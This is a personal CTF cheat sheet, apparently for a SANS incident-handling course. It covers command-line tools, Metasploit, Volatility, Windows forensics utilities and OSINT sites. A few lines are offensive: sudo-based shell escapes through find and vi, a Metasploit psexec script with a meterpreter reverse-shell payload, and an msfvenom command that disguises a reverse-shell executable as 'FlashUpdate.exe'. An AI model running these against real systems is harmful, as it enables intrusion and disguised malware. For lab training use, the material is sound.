# CTF Cheat Sheet <!-- omit in toc -->
&nbsp;
- [Command Line Interface](#command-line-interface)
  - [Linux CLI](#linux-cli)
  - [Windows CLI](#windows-cli)
  - [OS Agnostic CLI](#os-agnostic-cli)
  - [&nbsp;](#)
- [Frameworks](#frameworks)
  - [Metasploit](#metasploit)
  - [&nbsp;](#-1)
  - [Volatility Framework](#volatility-framework)
  - [&nbsp;](#-2)
- [GUI Applications](#gui-applications)
  - [Linux GUI Applications](#linux-gui-applications)
  - [Windows GUI Applications](#windows-gui-applications)
  - [OS Agnostic GUI Applications](#os-agnostic-gui-applications)
  - [&nbsp;](#-3)
- [Cloud Tools](#cloud-tools)
  - [&nbsp;](#-4)
- [Other Notes and Useful Information](#other-notes-and-useful-information)
  - [Network Investigations](#network-investigations)
  - [Memory Investigation](#memory-investigation)
  - [Recon, Scanning, and Enumeration](#recon-scanning-and-enumeration)
&nbsp;
# Command Line Interface
## Linux CLI
&nbsp;
&nbsp;
### A <!-- omit in toc -->
#### awk <!-- omit in toc -->
`awk -F: '{print $1}'` prints the first field when a file is separated by :
- `-F` define the Field Separator
  - `awk -F:` will split whatever you give it on the `:` character
- `'{print $1}'` prints field 1
  - the number can be swapped out from 0 to however many columns exist when the line is split based on the field separator
&nbsp;
&nbsp;
### C <!-- omit in toc -->
#### curl <!-- omit in toc -->
`curl http://some_website_or_ip` downloads the files located on some website or ip
&nbsp;
&nbsp;
### D <!-- omit in toc -->
#### dig <!-- omit in toc -->
DNS Interrogation tool
&nbsp;
&nbsp;
### F <!-- omit in toc -->
#### find <!-- omit in toc -->
`find / -name somefile` Searches the filesystem for a file
- `-name` sets the filename to look for. * is a wildcard
- `-iname` looks for a file case-insensitively
- `-exec` executes the next lines of code.
  - this can be used for PrivEsc with `sudo` permissions, like so:
    - `sudo find . -exec /bin/bash {} \;`
&nbsp;
&nbsp;
### G <!-- omit in toc -->
#### grep <!-- omit in toc -->
`grep "some string" /path/to/file` looks for some string in file
- `-e` allows for the use of regex
  - `egrep` is a similar command to `grep -e` but with a few different options.
- `-i` case insensitive mode
- `-v` returns the contents of the file _without_ the matching lines
&nbsp;
&nbsp;
### H <!-- omit in toc -->
#### head <!-- omit in toc -->
`head somefile` prints the top lines of the file
- `-1` through `-20` will print the top _n_ lines of the file, based on what number follows the -
&nbsp;
&nbsp;
### J <!-- omit in toc -->
#### john <!-- omit in toc -->
`john some_file_of_credentials` attempts to crack passwords
- `--format=FORMAT` tells john what format the credentials are
- `--wordlist=/path/to/wordlist.txt` tells john which wordlist to use
&nbsp;
&nbsp;
#### jq <!-- omit in toc -->
`jq {some_regex_pattern} some_json_file.json` parses the json file and returns key/value pairs that match `some_regex_pattern`
&nbsp;
&nbsp;
### L <!-- omit in toc -->
#### less <!-- omit in toc -->
`less somefile` prints an amount of lines in the file
&nbsp;
&nbsp;
### M <!-- omit in toc -->
#### man <!-- omit in toc -->
`man some_command` shows the manual pages for some_command, if they exist
&nbsp;
&nbsp;
#### masscan <!-- omit in toc -->
`sudo masscan {NETWORK_ID/CIDR}` scans a large range of IPs very quickly
- `-p` define the ports to scan
&nbsp;
&nbsp;
#### md <!-- omit in toc -->5sum
`md5sum some_file` calculates the MD5 sum of some_file
&nbsp;
&nbsp;
### N <!-- omit in toc -->
#### nano <!-- omit in toc -->
launches the nano editor
&nbsp;
&nbsp;
#### netstat <!-- omit in toc -->
`netstat` shows network statistics
- `-l`
- `-n`
- `-p`
&nbsp;
&nbsp;
#### nmap <!-- omit in toc -->
`nmap {IP_ADDR or NETWORK_ID/CIDR}` scans the given IP Address or Network range
```bash
nmap 192.168.0.1
nmap 192.168.0.1-254
nmap 192.168.0.1/24
```
- `-p` defines the ports to scan
  - `-p-` scan all ports
  - `-p 21,22,23,80,443` scans the ports from a list
  - `-p 0-1023` scans the ports in a range
  - `-p 21-25,80,443,445` hybrid of list and range 
- `--reason` gives reasoning why nmap says what it does
- `-sV` runs the version scanner
- `-T5` runs things in a quick configuration
- `--script=` allows you to run a specific `nmap` script
  - `dns-brute`
&nbsp;
&nbsp;
### R <!-- omit in toc -->
#### recon-ng <!-- omit in toc -->
OSINT tool
&nbsp;
&nbsp;
#### rpcclient <!-- omit in toc -->
allows linux to send remote procedure calls to windows machines
&nbsp;
&nbsp;
### S <!-- omit in toc -->
#### script <!-- omit in toc -->
enables logging of the current shell
&nbsp;
&nbsp;
#### sed <!-- omit in toc -->
`sed "s/somepattern/replacement/" file_or_string` replaces instances of somepattern with replacement 
&nbsp;
&nbsp;
#### smbclient <!-- omit in toc -->
allows linux to interact with windows smb
&nbsp;
&nbsp;
#### sudo <!-- omit in toc -->
`sudo ls` "**S**uper **U**ser **DO**". Runs things as root. Commonly used to  PrivEsc.
- `-l` lists what actions a user is allowed to run with `sudo`
&nbsp;
&nbsp;
### T <!-- omit in toc -->
#### tail <!-- omit in toc -->
`tail somefile` prints the bottom lines of the file
- `-1` through `-20` will print the bottom _n_ lines of the file, based on what number follows the -
&nbsp;
&nbsp;
#### tcpdump <!-- omit in toc -->
`sudo tcpdump -i eth0 'src host 192.168.0.1 and dst port 80'`
It's like wireshark but for CLI. Uses Berkeley Packet Filtering. Needs sudo most of the time.
- `-A` prints the ASCII Hex output of the packet
- `-i` tells `tcpdump` which interface to use
  - We should be using `TAP1` or something similar in the CTF Challenge
  - `lo` is the loopback virtual interface
- `-n` disables name resolution
- `-v` enables verbose mode (more v = more verbose)
&nbsp;
&nbsp;
### V <!-- omit in toc -->
#### vi <!-- omit in toc -->
Launches the vi editor
- not sure why you'd ever need this on your own attack platform as you should have `vim` or `nano` installed, but still useful for when you get onto pivot machines that don't have either of those and you need a command-line editor.
&nbsp;
&nbsp;
#### vim <!-- omit in toc -->
Launches the VI Improved editor
- I'm not good at using `vi` or `vim` so you'll have to get help from the documentation. I do know you can do a shell escape with both `vi` and `vim` by running something along the lines of:
  - `sudo vi somefile`
  - (once inside the editor, press `[ESC]` and run the following command:)
  - `!/bin/bash`
&nbsp;
&nbsp;
### W <!-- omit in toc -->
#### w <!-- omit in toc -->
`w` prints a list of all currently logged on users and what they're doing
#### who <!-- omit in toc -->
`who` prints a list of all currently logged on users
#### whois <!-- omit in toc -->
DNS interrogation query
&nbsp;
&nbsp;
### Z <!-- omit in toc -->
#### zgrep <!-- omit in toc -->
`zgrep 'somestring' some_compressed_file.gz` looks through a compressed file or archive to find specific text
&nbsp;
&nbsp;
## Windows CLI
&nbsp;
&nbsp;
### C <!-- omit in toc -->
#### certutil <!-- omit in toc -->
`certutil -hashfile some_file MD5` calculates the MD5 hash of some_file
&nbsp;
&nbsp;
## D <!-- omit in toc -->
### DeepBlue.ps1 <!-- omit in toc -->
PowerShell Module for Threat Hunting via Windows Event Logs
`.\DeepBlue.ps1 <event log name> <evtx filename>`
- [Documentation](https://github.com/sans-blue-team/DeepBlueCLI)
&nbsp;
&nbsp;
### N <!-- omit in toc -->
#### net <!-- omit in toc -->
- `net localgroup`
  - lists all local groups
  - `net localgroup GROUPNAME` lists info about a specific local group
- `net use * \\path\to\network\share$`
  - mounts network share
- `net user`
  - lists all users
  - `net user USERNAME` lists info about a specific user
&nbsp;
&nbsp;
#### netstat <!-- omit in toc -->
`netstat` shows network statistics
- `-a` display all active TCP and UDP connections
- `-n` do not resolve names
- `-o` show the process id is associated with that connection
- `-b` shows what program is associated with that connection
&nbsp;
&nbsp;
### S <!-- omit in toc -->
#### schtasks <!-- omit in toc -->
- shows all tasks
&nbsp;
&nbsp;
#### Sysinternals <!-- omit in toc -->
These tools from the Sysinternals library run as CLI. When possible use 64bit versions.
- Procdump
  - Dumps info related to a specific process
- PsExec
  - Runs a program on a remote system, where remotely executed console
applications execute interactively.
- PsList
  - Lists all processes
- PsTree
  - Lists all processes in Tree form, where children are nested under their parent process
- Strings
  - Prints strings grabbed from the executable binaries.
&nbsp;
&nbsp;
### W <!-- omit in toc -->
#### wmic <!-- omit in toc -->
`wmic {WMI_TYPE} list {brief/full}` WMIC is a software utility that allows users to performs Windows Management Instrumentation (WMI) operations with a command prompt.
- `process` gets information for all processes
- `service` gets information for all services 
- `where {FIELD}="{VALUE}"` simple filtering, example being:
  - `where name=nssm.exe`
- `list brief` short list
- `list full` used to view more detailed info about what's being searched
- `/node:"SERVER_NAME"` allows for connection to remote server
- `/user:"somedomain\someuser"` lets you make the wmic request with this user account (domain is optional)
- `/failfast:on` speeds things up when `wmic` queries fail
&nbsp;
Useful examples: 
- `wmic process where name="FlashUpdate.exe" list full`
- `wmic service where name="WpnUserService_5d314e6" list full`
&nbsp;
&nbsp;
## OS Agnostic CLI
&nbsp;
&nbsp;
### H <!-- omit in toc -->
#### hashcat <!-- omit in toc -->
`hashcat some_file_of_hashes some_wordlist` attempts to crack the hashes using the provided wordlist
- `-a` sets hashcat to attack mode (used when cracking passwords)
- `-h` shows the help menu (useful for finding which hashing mode you want to use)
- `-m` sets the hashing mode
&nbsp;
&nbsp;
### N <!-- omit in toc -->
#### netcat <!-- omit in toc -->, ncat, nc
`netcat 192.168.0.2 4444` makes a connection to 192.168.0.2 on port 4444
- `-lp {PORT}` opens listener on `{PORT}`
- `-v` turns on verbose mode
- `-u` forces udp traffic
&nbsp;
&nbsp;
### W <!-- omit in toc -->
#### whoami <!-- omit in toc -->
`whoami` prints the username of whomever you're currently logged on as
&nbsp;
---
&nbsp;
# Frameworks
## Metasploit
&nbsp;
&nbsp;
### Automation <!-- omit in toc -->
Store raw msfconsole commands in `.rc` files and then execute them with `msfconsole -q -r some_rc_file.rc`.
Example rc file:
```
use exploit/windows/smb/psexec
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST 10.10.0.1
set SMBUSER sec504
set SMBPASS sec504
set LHOST 10.10.75.1
exploit
```
&nbsp;
&nbsp;
### msfconsole <!-- omit in toc -->
`msfconsole` launches the console
#### Arguments <!-- omit in toc -->
- `-q` launch in quiet mode (slightly faster)
&nbsp;
&nbsp;
#### Commands <!-- omit in toc -->
- `exploit` / `run`
  - attempts to run the exploit with the current options
- `search`
  - searches exploits, payloads, and other tools for the given string
- `set`
  - can be used to set the options for the exploit & payload, or used to choose which payload to send
    - `set LHOST 10.10.75.1`
    - `set PAYLOAD windows/meterpreter/reverse_tcp`
- `show options`
  - shows the options as currently configured
- `use`
  - sets the exploit
    - `use exploit/windows/smb/psexec`
&nbsp;
&nbsp;
### meterpreter <!-- omit in toc -->
  - `background` puts the current meterpreter session in the background
&nbsp;
&nbsp;
#### msfvenom <!-- omit in toc -->
Allows for the creation of specifically packaged and targeted malware.
- Example:
  - `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.75.1 lport=4444 -f exe -o ./FlashUpdate.exe`
&nbsp;
---
&nbsp;
&nbsp;
## Volatility Framework 
`python vol.py` runs the volatility framework. See 504.1 Lab #3 for more information
- `python vol.py dlllist > outfile.txt`
- `python vol.py filescan > outfile.txt`
- `python vol.py pstree > outfile.txt`
- `python vol.py netscan > outfile.txt`
&nbsp;
---
&nbsp;
# GUI Applications
## Linux GUI Applications
## B <!-- omit in toc -->
#### BeEF <!-- omit in toc -->
Used for website attacks. Many options and configurations
&nbsp;
&nbsp;
## Windows GUI Applications
### R <!-- omit in toc -->
#### RegEdit <!-- omit in toc -->
Registry Viewer
- `HKLM\Software\Microsoft\Windows\CurrentVersion\...`
  - `\Run` Starts the program every time someone logs in or system boots (need to figure out which)
  - `\RunOnce` Starts the program only once when someone logs in / system boots (need to figure out which) then removes this key from the registry
&nbsp;
&nbsp;
### S <!-- omit in toc -->
#### Services <!-- omit in toc -->.msc
Service Viewer. Useful for finding malicious services based on signing and privilege level.
&nbsp;
&nbsp;
#### Sysinternals <!-- omit in toc -->
These tools from the Sysinternals library run as GUI Apps. When possible, use the 64bit versions.
- `AutoRuns` Lists everything that starts when user logs in. BE SURE TO ENABLE WINDOWS SERVICES AND PROCESSES! 
- `Procexp` Shows heirarchial view of all processes (Useful to see if one program spawned a child program it shouldn't)
- `Procmon` Monitors just about everything going on in the processes. Filter down by the specific process that's suspicious.
- `TCPView` Shows all network traffic. Useful to see if a program that shouldn't be making network connections is sending or receiving traffic 
&nbsp;
&nbsp;
### T <!-- omit in toc -->
#### Task <!-- omit in toc --> Scheduler
Built-in windows task viewer. Can be used to see all the tasks and find malicious ones.
&nbsp;
&nbsp;
## OS Agnostic GUI Applications
### S <!-- omit in toc -->
#### Spiderfoot <!-- omit in toc -->
OSINT tool (WebAPP). Might not be used in CTF but still useful.
&nbsp;
---
&nbsp;
# Cloud Tools
## A <!-- omit in toc -->
### aws <!-- omit in toc -->
`aws` run commands on an amazon web service server
&nbsp;
---
&nbsp;
# Other Notes and Useful Information
&nbsp;
&nbsp;
## Network Investigations
### Sources <!-- omit in toc -->
- Network Traffic
- Network Devices
  - Servers, Routers, Switches
- Host Devices
  - Workstations
&nbsp;
&nbsp;
### Challenges <!-- omit in toc -->
- Data Export
  - information leaving the network that shouldn't be
- Missing Data
  - Gaps in Logs
  - Missing User Accounts, Registry Keys, profiles, etc.
  - "The bird's stopped chirping."
- Encryption
  - a la ransomware
  - executables that can't be run without the encryption key (making antivirus's job that much harder)
&nbsp;
| Old-School | New School |
|------------|------------|
|`.pcap`     |`.pcapng`   |
&nbsp;
Use TCPDump with BPF when capturing live traffic to cut out unwanted traffic during investiations
&nbsp;
Bypassing Proxies means 1 of 2 things;
- The proxy is misconfigured
- They're intentionally bypassing the proxy
&nbsp;
`robotx.txt` is a goldmine when exploiting webapps
&nbsp;
&nbsp;
## Memory Investigation
- Virtual Environment ≠ Virtual Machine
- Make sure memory dumps also come with OS and Version
&nbsp;
&nbsp;
## Recon, Scanning, and Enumeration
_"As long as it's in-scope, I'm going to Cheat"_
\- Mr. Douglas
&nbsp;
&nbsp;
### Recon <!-- omit in toc -->
Use Spiderfoot and recon-ng
&nbsp;
&nbsp;
### OSINT Search-Engine Recon <!-- omit in toc -->
- Google Dorking (504.2 p43)
- SEC Edgar
- xlek.com
- namechk.com
- whatsmyname.app
- shodan.io